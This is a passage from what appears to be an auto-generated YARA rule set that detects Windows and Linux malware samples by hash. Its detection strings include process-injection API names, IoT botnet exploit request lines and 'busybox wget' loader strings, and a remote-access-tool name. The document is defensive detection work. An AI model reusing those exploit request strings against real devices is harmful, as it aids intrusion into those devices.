        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "System.Runtime.CompilerServices"
        $s7 = "System.Runtime.InteropServices"
        $s8 = "System.Diagnostics"
        $s9 = "TargetFrameworkAttribute"
        $s10 = "System.Runtime.Versioning"
        $s11 = "AssemblyFileVersionAttribute"
        $s12 = "Framework.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{863F4E86-8B82-4516-A5DA-5B68D0263B21}"
        $s15 = "<Module>{6f0a29d3-3420-4578-807e-6edb6f462410}"
        $s16 = "kernel32.dll"
        $s17 = "CreateRemoteThread"
        $s18 = "System.IO"
        $s19 = "Module"
        $s20 = "System.Security.Cryptography"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 578KB and
        all of them
}

rule Windows_87b8b2a322467b783909e0fdad2d1745159377950eb1f8fb2a53e5bb00cb7fd5
{
    meta:
        description = "Auto ML: 87b8b2a322467b783909e0fdad2d1745159377950eb1f8fb2a53e5bb00cb7fd5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "kernel32.dll"
        $s7 = "SetDllDirectoryW"
        $s8 = "SetSearchPathMode"
        $s9 = "SetProcessDEPPolicy"
        $s10 = "TEMP"
        $s11 = "USERPROFILE"
        $s12 = "GetUserDefaultUILanguage"
        $s13 = "TCustomFile"
        $s14 = "TFile"
        $s15 = "EFileError"
        $s16 = "File I/O error %d"
        $s17 = "TCompressedBlockReader"
        $s18 = "TSetupLanguageEntryA"
        $s19 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s20 = "shell32.dll"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 6885KB and
        all of them
}

rule Windows_0c77140267d3698f825ef41a02a49a8593bd5df4db00c1bdbe0fcc15bfee3df5
{
    meta:
        description = "Auto ML: 0c77140267d3698f825ef41a02a49a8593bd5df4db00c1bdbe0fcc15bfee3df5"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = ".data"
        $s3 = "processorArchitecture=\"X86\""
        $s4 = "name=\"Enigma.exe\""
        $s5 = "type=\"win32\" />"
        $s6 = "type=\"win32\""
        $s7 = "name=\"Microsoft.Windows.Common-Controls\""
        $s8 = "processorArchitecture=\"X86\""
        $s9 = "Lhttp://pki-crl.symauth.com/ca_732b6ec148d290c0a071efd1dac8e288/LatestCRL.crl07"
        $s10 = "http://pki-ocsp.symauth.com0"
        $s11 = "ehttp://pki-crl.symauth.com/offlineca/TheInstituteofElectricalandElectronicsEngineersIncIEEERootCA.crl0"
        $s12 = "kernel32.dll"
        $s13 = "user32.dll"
        $s14 = "advapi32.dll"
        $s15 = "oleaut32.dll"
        $s16 = "shell32.dll"
        $s17 = "version.dll"
        $s18 = "CRYPT32.dll"
        $s19 = "SHLWAPI.dll"
        $s20 = "gdiplus.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1833KB and
        all of them
}

rule Windows_87dc843c26db143ec9d2869ee4be3e53593fa7b4331a0ceb170f6e2339caa304
{
    meta:
        description = "Auto ML: 87dc843c26db143ec9d2869ee4be3e53593fa7b4331a0ceb170f6e2339caa304"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 209KB and
        all of them
}

rule Linux_880a57b45cb30cebd23b796fde0dd57259f5988c540dca1e196be0f6776a6db2
{
    meta:
        description = "Auto ML: 880a57b45cb30cebd23b796fde0dd57259f5988c540dca1e196be0f6776a6db2"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "sfga"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 15KB and
        all of them
}

rule Windows_880e3f283194f01bd82af5fc16eca910e6e0b64b30fb46c0f642fe36b095478e
{
    meta:
        description = "Auto ML: 880e3f283194f01bd82af5fc16eca910e6e0b64b30fb46c0f642fe36b095478e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "GetCurrentProcessId"
        $s7 = "SetClipboardData"
        $s8 = "GetStringTypeA"
        $s9 = "GetThreadLocale"
        $s10 = "GetCurrentThreadId"
        $s11 = "CloseHandle"
        $s12 = "Thread32Next"
        $s13 = "WriteProcessMemory"
        $s14 = "GetCurrentProcess"
        $s15 = "LoadLibraryW"
        $s16 = "GetModuleHandleA"
        $s17 = "SetStdHandle"
        $s18 = "GetProcAddress"
        $s19 = "GetSystemTimeAsFileTime"
        $s20 = "SetProcessAffinityMask"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6208KB and
        all of them
}

rule Windows_883006e791321cb9dff98bf1be3f1ef40bcb3a21ebf668bd75554f89331256ef
{
    meta:
        description = "Auto ML: 883006e791321cb9dff98bf1be3f1ef40bcb3a21ebf668bd75554f89331256ef"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "IReadOnlyCollection`1"
        $s5 = "ISet`1"
        $s6 = "HashSet`1"
        $s7 = "IReadOnlyList`1"
        $s8 = "get_Item1"
        $s9 = "System.IConvertible.ToUInt32"
        $s10 = "ReadInt32"
        $s11 = "System.IConvertible.ToInt32"
        $s12 = "ReadAsInt32"
        $s13 = "IReadOnlyDictionary`2"
        $s14 = "get_Item2"
        $s15 = "System.IConvertible.ToUInt64"
        $s16 = "ReadInt64"
        $s17 = "System.IConvertible.ToInt64"
        $s18 = "ReadUInt16"
        $s19 = "System.IConvertible.ToUInt16"
        $s20 = "System.IConvertible.ToInt16"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1070KB and
        all of them
}

rule Windows_8836e9f5373e2030728938432ad14b81076cf5205cd6d862d9fc9d1452ff584b
{
    meta:
        description = "Auto ML: 8836e9f5373e2030728938432ad14b81076cf5205cd6d862d9fc9d1452ff584b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "CWinThread"
        $s7 = "RegOpenKeyTransactedW"
        $s8 = "RegCreateKeyTransactedW"
        $s9 = "RegDeleteKeyTransactedW"
        $s10 = "CCmdTarget"
        $s11 = "UnregisterTouchWindow"
        $s12 = "RegisterTouchWindow"
        $s13 = "CloseTouchInputHandle"
        $s14 = "GetTouchInputInfo"
        $s15 = "@CloseGestureInfoHandle"
        $s16 = "GetGestureInfo"
        $s17 = "RegDeleteKeyExW"
        $s18 = "CFile"
        $s19 = "CreateFileTransactedW"
        $s20 = "CWindowDC"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1603KB and
        all of them
}

rule Windows_885e71a79cae7e2ce156cf2dd4c166538a0b2bf02a5d170a9d13ded41748113d
{
    meta:
        description = "Auto ML: 885e71a79cae7e2ce156cf2dd4c166538a0b2bf02a5d170a9d13ded41748113d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 180KB and
        all of them
}

rule Linux_88b383081c46232d2a0c46cf8c35b84ac92417eeae25a386f1de3dc2d8336269
{
    meta:
        description = "Auto ML: 88b383081c46232d2a0c46cf8c35b84ac92417eeae25a386f1de3dc2d8336269"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "/proc/%d/cmdline"
        $s7 = "wget"
        $s8 = "/usr/lib/systemd/systemd"
        $s9 = "/usr/libexec/openssh/sftp-server"
        $s10 = "shell"
        $s11 = "httpd"
        $s12 = "system"
        $s13 = "GET /%s HTTP/1.0"
        $s14 = "User-Agent: Update v1.0"
        $s15 = "No such file or directory"
        $s16 = "No such process"
        $s17 = "Interrupted system call"
        $s18 = "Bad file descriptor"
        $s19 = "No child processes"
        $s20 = "Resource temporarily unavailable"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 176KB and
        all of them
}

rule Linux_88dc309153f65bd0644c4b91d1141bcfaea7d4e9a0d8069807686e1a1f362433
{
    meta:
        description = "Auto ML: 88dc309153f65bd0644c4b91d1141bcfaea7d4e9a0d8069807686e1a1f362433"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "shell"
        $s12 = "httpd"
        $s13 = "system"
        $s14 = "wget-log"
        $s15 = "1337SoraLOADER"
        $s16 = "nloads"
        $s17 = "elfLoad"
        $s18 = "/usr/libexec/openssh/sftp-server"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 161KB and
        all of them
}

rule Windows_88f0722c907100ef09049c82032a0ac66afa153d03fb89d378ae65f6e5890a3f
{
    meta:
        description = "Auto ML: 88f0722c907100ef09049c82032a0ac66afa153d03fb89d378ae65f6e5890a3f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "network reset"
        $s7 = "no child process"
        $s8 = "no such file or directory"
        $s9 = "no such process"
        $s10 = "not a socket"
        $s11 = "not connected"
        $s12 = "read only file system"
        $s13 = "text file busy"
        $s14 = "too many files open in system"
        $s15 = "too many files open"
        $s16 = "already connected"
        $s17 = "bad file descriptor"
        $s18 = "connection aborted"
        $s19 = "connection already in progress"
        $s20 = "connection refused"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 486KB and
        all of them
}

rule Windows_88f244f1882d4be11fb49e7a367cd93d57f2bed658f573b4d51a277822d17840
{
    meta:
        description = "Auto ML: 88f244f1882d4be11fb49e7a367cd93d57f2bed658f573b4d51a277822d17840"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "!setybdeta}"
        $s5 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s6 = "PGma.System.MouseKeyHook, Version=5.6.130.0, Culture=neutral, PublicKeyToken=null"
        $s7 = "DQuasar.Common, Version=1.4.1.0, Culture=neutral, PublicKeyToken=null"
        $s8 = "SetEofOn00"
        $s9 = "<GetPacketTypes>b__3_0"
        $s10 = "<WinSCPDecrypt>b__4_0"
        $s11 = "OffsetMAIN_0"
        $s12 = "<GetReverseProxyByConnectionId>b__0"
        $s13 = "<GetKeyValues>b__0"
        $s14 = "<Process>b__0"
        $s15 = "get_Scan0"
        $s16 = "ProcessCrlB1"
        $s17 = "MicrosoftCertTemplateV1"
        $s18 = "get_KnowledgeProofForX1"
        $s19 = "Http_1_1"
        $s20 = "<GetKeyValues>b__15_1"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 3295KB and
        all of them
}

rule Windows_0c7829f63c451c0af41284aa465a7f560775acd9e228b789a047b80ebd7f4b3d
{
    meta:
        description = "Auto ML: 0c7829f63c451c0af41284aa465a7f560775acd9e228b789a047b80ebd7f4b3d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 312KB and
        all of them
}

rule Linux_8903c6adb88d2a77ed5442ffa3ca3f7a712ec864b260a09a36994211214d1a7c
{
    meta:
        description = "Auto ML: 8903c6adb88d2a77ed5442ffa3ca3f7a712ec864b260a09a36994211214d1a7c"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Windows XP"
        $s2 = "M-SEARCH * HTTP/1.1"
        $s3 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "shell"
        $s12 = "httpd"
        $s13 = "system"
        $s14 = "wget-log"
        $s15 = "1337SoraLOADER"
        $s16 = "nloads"
        $s17 = "elfLoad"
        $s18 = "/usr/libexec/openssh/sftp-server"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 107KB and
        all of them
}

rule Linux_8958c12355079917a62570de09ae003681e66150a8e4aaa24427735a31cb530e
{
    meta:
        description = "Auto ML: 8958c12355079917a62570de09ae003681e66150a8e4aaa24427735a31cb530e"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 41KB and
        all of them
}

rule Windows_8960100ed18988a177edb0c6825ebe9319cc350c344ce7ce40df4a9d50c44e6f
{
    meta:
        description = "Auto ML: 8960100ed18988a177edb0c6825ebe9319cc350c344ce7ce40df4a9d50c44e6f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "`non-type-template-parameter"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 228KB and
        all of them
}

rule Windows_897b63dc56623c54120c95340a7e8c416786dbc18bb03dae3300ab2fd57e928a
{
    meta:
        description = "Auto ML: 897b63dc56623c54120c95340a7e8c416786dbc18bb03dae3300ab2fd57e928a"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Security"
        $s13 = "SecurityRuleSet"
        $s14 = "eye_friendly_mode_with_customization.exe"
        $s15 = "<Module>"
        $s16 = "ThreadSafeObjectProvider`1"
        $s17 = "MySettings"
        $s18 = "ApplicationSettingsBase"
        $s19 = "System.Configuration"
        $s20 = "MySettingsProperty"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6617KB and
        all of them
}

rule Windows_8a020aab0287b59502a256c75272770048fab37c5625fd81128cbb699d5d4559
{
    meta:
        description = "Auto ML: 8a020aab0287b59502a256c75272770048fab37c5625fd81128cbb699d5d4559"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "An application has made an attempt to load the C runtime library incorrectly."
        $s7 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s8 = "- Attempt to initialize the CRT more than once."
        $s9 = "- unable to open console device"
        $s10 = "- unexpected multithread lock error"
        $s11 = "- not enough space for thread data"
        $s12 = "- floating point support not loaded"
        $s13 = "FlsSetValue"
        $s14 = "FlsGetValue"
        $s15 = "GAIsProcessorFeaturePresent"
        $s16 = "KERNEL32"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 256KB and
        all of them
}

rule Windows_8a153debc69f1d51f36df5763d50971a0f6b0ff6d88012abfc619a9633cc2818
{
    meta:
        description = "Auto ML: 8a153debc69f1d51f36df5763d50971a0f6b0ff6d88012abfc619a9633cc2818"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "@.reloc"
        $s6 = "GetNativeSystemInfo"
        $s7 = "kernel32.dll"
        $s8 = "FlsGetValue"
        $s9 = "FlsSetValue"
        $s10 = "delete"
        $s11 = "delete[]"
        $s12 = "`placement delete closure'"
        $s13 = "`placement delete[] closure'"
        $s14 = "`local static thread guard'"
        $s15 = "CorExitProcess"
        $s16 = "GetCurrentPackageId"
        $s17 = "GetDateFormatEx"
        $s18 = "GetSystemTimePreciseAsFileTime"
        $s19 = "GetTimeFormatEx"
        $s20 = "internal error: invalid forward reference offset"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1209KB and
        all of them
}

rule Windows_8a52d87aa80812e9d072f7f197f320f8a7d253ddc1a6070b014cb35189d3fddd
{
    meta:
        description = "Auto ML: 8a52d87aa80812e9d072f7f197f320f8a7d253ddc1a6070b014cb35189d3fddd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "jMclr-namespace:Microsoft.Windows.Themes;assembly=PresentationFramework.Classic"
        $s6 = "Microsoft.Windows.Themes"
        $s7 = "aSystem.Windows.Controls.Ribbon, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
        $s8 = "A%clr-namespace:System.Windows.Controls"
        $s9 = "System.Windows.Controls"
        $s10 = "O,clr-namespace:System.Windows.Controls.Ribbon"
        $s11 = "System.Windows.Controls.Ribbon"
        $s12 = "e7clr-namespace:System.Windows.Controls.Ribbon.Primitives)System.Windows.Controls.Ribbon.Primitives"
        $s13 = "ZAclr-namespace:System.Windows.Shell;assembly=PresentationFramework"
        $s14 = "System.Windows.Shell"
        $s15 = "N;clr-namespace:System.Windows;assembly=PresentationFramework"
        $s16 = "System.Windows"
        $s17 = "1&clr-namespace:System;assembly=mscorlib"
        $s18 = "System"
        $s19 = "NWindowsBase, Version=4.0.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35"
        $s20 = "NSystem.Xaml, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1071KB and
        all of them
}

rule Windows_8a6478be6724353a423b6246ebbd3e586c908832c0a5715050935d421d7d4512
{
    meta:
        description = "Auto ML: 8a6478be6724353a423b6246ebbd3e586c908832c0a5715050935d421d7d4512"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "05cYHaq9wWRl&mypsET\"!/2@"
        $s5 = ":owXWsetbe"
        $s6 = "wXot-i5`aq9pgPlElypGET39/0=Mvh7|AY83ktdgzsP4_"
        $s7 = "XSeT"
        $s8 = "WiNt"
        $s9 = "leq8joTlfgetqEZ91259Mwf+mlT>vizjztuW5e"
        $s10 = "System.IO"
        $s11 = "System.Collections.Generic"
        $s12 = "add_Load"
        $s13 = "get_IndianRed"
        $s14 = "get_Enabled"
        $s15 = "set_Enabled"
        $s16 = "set_FormattingEnabled"
        $s17 = "get_IsCompleted"
        $s18 = "get_highSchoolGrade"
        $s19 = "set_highSchoolGrade"
        $s20 = "set_AutoScaleMode"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1148KB and
        all of them
}

rule Windows_8a6587bf245cd55599ac872ba8299b6631dca6171c0b637ff85ac47a3649d064
{
    meta:
        description = "Auto ML: 8a6587bf245cd55599ac872ba8299b6631dca6171c0b637ff85ac47a3649d064"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 253KB and
        all of them
}

rule Windows_8aa65358ef1e12582637acfac6035208e5d62fc9d39e715194d26c81502f0e2d
{
    meta:
        description = "Auto ML: 8aa65358ef1e12582637acfac6035208e5d62fc9d39e715194d26c81502f0e2d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "attempts."
        $s6 = "You are getting closer."
        $s7 = "You are very close!"
        $s8 = "attempts. The correct number was"
        $s9 = "ios_base::badbit set"
        $s10 = "ios_base::failbit set"
        $s11 = "ios_base::eofbit set"
        $s12 = "already connected"
        $s13 = "bad file descriptor"
        $s14 = "connection aborted"
        $s15 = "connection already in progress"
        $s16 = "connection refused"
        $s17 = "connection reset"
        $s18 = "file exists"
        $s19 = "file too large"
        $s20 = "filename too long"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 604KB and
        all of them
}

rule Linux_0cd1918717eb72d202bc7ce449d17ea01b94a298f54b034fed67122ef3750096
{
    meta:
        description = "Auto ML: 0cd1918717eb72d202bc7ce449d17ea01b94a298f54b034fed67122ef3750096"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "bin/systemd"
        $s7 = "/bin/systemd"
        $s8 = "GET /%s HTTP/1.0"
        $s9 = "User-Agent: Update v1.0"
        $s10 = "No such file or directory"
        $s11 = "No such process"
        $s12 = "Interrupted system call"
        $s13 = "Bad file descriptor"
        $s14 = "No child processes"
        $s15 = "Resource temporarily unavailable"
        $s16 = "File exists"
        $s17 = "Too many open files in system"
        $s18 = "Too many open files"
        $s19 = "Text file busy"
        $s20 = "File too large"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 103KB and
        all of them
}

rule Linux_8abfc48c7084fadbd00f9ba6bb450b6688ca0159ba7be635b9ec5223f00c1989
{
    meta:
        description = "Auto ML: 8abfc48c7084fadbd00f9ba6bb450b6688ca0159ba7be635b9ec5223f00c1989"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "/system"
        $s2 = "/ (deleted)"
        $s3 = "M-SEARCH * HTTP/1.1"
        $s4 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s5 = "Windows XP"
        $s6 = "No such file or directory"
        $s7 = "No such process"
        $s8 = "Interrupted system call"
        $s9 = "Bad file descriptor"
        $s10 = "No child processes"
        $s11 = "Resource temporarily unavailable"
        $s12 = "File exists"
        $s13 = "Too many open files in system"
        $s14 = "Too many open files"
        $s15 = "Text file busy"
        $s16 = "File too large"
        $s17 = "Read-only file system"
        $s18 = "File name too long"
        $s19 = "Level 3 reset"
        $s20 = "Bad font file format"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 58KB and
        all of them
}

rule Windows_8afd60f7ef24ac692068525fb3c91e74c60c066dff1f778db851ecc7b691f0bb
{
    meta:
        description = "Auto ML: 8afd60f7ef24ac692068525fb3c91e74c60c066dff1f778db851ecc7b691f0bb"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Reflection"
        $s5 = "System"
        $s6 = "TargetFrameworkAttribute"
        $s7 = "System.Runtime.Versioning"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "System.Runtime.CompilerServices"
        $s10 = "AssemblyFileVersionAttribute"
        $s11 = "System.Diagnostics"
        $s12 = "History.exe"
        $s13 = "<Module>"
        $s14 = "<Module>{7EF9DE15-7562-4D00-B112-6B24BF6176B7}"
